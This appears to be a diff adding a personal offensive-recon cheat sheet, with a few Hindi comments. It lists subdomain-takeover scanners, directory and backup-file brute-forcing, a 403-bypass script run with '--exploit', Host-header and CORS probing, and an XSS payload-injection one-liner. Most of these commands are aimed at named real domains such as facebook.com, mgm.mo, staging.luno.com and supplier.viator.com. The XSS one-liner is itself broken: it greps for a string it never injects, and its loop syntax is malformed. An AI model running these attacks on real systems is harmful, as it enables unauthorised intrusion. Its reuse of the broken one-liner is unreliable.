@@ -1,0 +1,67 @@
+subjack -w facebook_subdomains.txt -t 50 -timeout 60 -ssl -v -c /root/go/pkg/mod/github.com/haccer/subjack@v*/fingerprints.json -o final_result.txt
+
+subfinder -d facebook.com -o facebook_subdomains.txt
+
+python3 takeover.py -l /root/ifd_subdomains.txt > /root/ifd_result.txt -v
+
+./subover -l /root/ifd_subdomains.txt > /root/subover_ifd_result.txt -v
+
+/root/go/bin/subzy run --targets mgm_subdomains.txt > subzy_result.txt
+
+gobuster dir -u https://staging.luno.com -w /usr/share/wordlists/dirb/common.txt -t 50 -k -o luno-dir.txt
+
+./403-bypass.sh -u https://mgm.mo --exploit
+
+dirsearch -u supplier.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql,gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+
+# Single target - comprehensive ports
+nmap --script cicd-pipeline-scanner.nse -p 80,443,8080,8443,9000,3000,4000 target.com
+
+nmap --script supply-chain-poisoning-detector.nse -p 80,443,8080,8443,9000,3000,4000 asia.arlo.com
+
+nmap -sV mgm.mo
+
+# 1) nmap with extra http/ssl scripts
+nmap -p 80,443 -sV --script=http-title,http-headers,ssl-cert mgm.mo
+
+# 2) show HTTP headers
+curl -I -L https://mgm.mo
+
+# 3) check cert / SNI
+openssl s_client -showcerts -connect mgm.mo:443 -servername mgm.mo </dev/null
+
+# 4) try Host header (information only)
+curl -I -H "Host: mgm.mo" https://mgm.mo
+curl -I -H "Host: some-other-host.example" https://mgm.mo
+
+curl -s "https://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.google.com&output=json" | \
+jq -r '.url' 2>/dev/null | tee commoncrawl_urls.txt
+
+# Katana se live URLs crawl karein
+katana -u "https://google.com" -silent -headless -depth 1 | tee katana_urls.txt
+OR DONO SAME HE
+waybackurls target.com | tee -a test.txt
+
+cat test.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(king)" && echo "$host \033[0;31mVulnerable\n";done
+
+./xss_scan.sh test.txt vulnerable.txt
+
+cd elite_unicode_framework
+
+python main.py -t https://target.com -e victim@target.com
+
+python3 cors_scanner.py --url https://mgm.mo/api
+
+python linkfinder.py -i https://example.com/1.js -o results.html
+
+python linkfinder.py -i https://example.com/1.js -o cli
+
+python linkfinder.py -i https://example.com -d
+
+
+
+
+
+
+
+
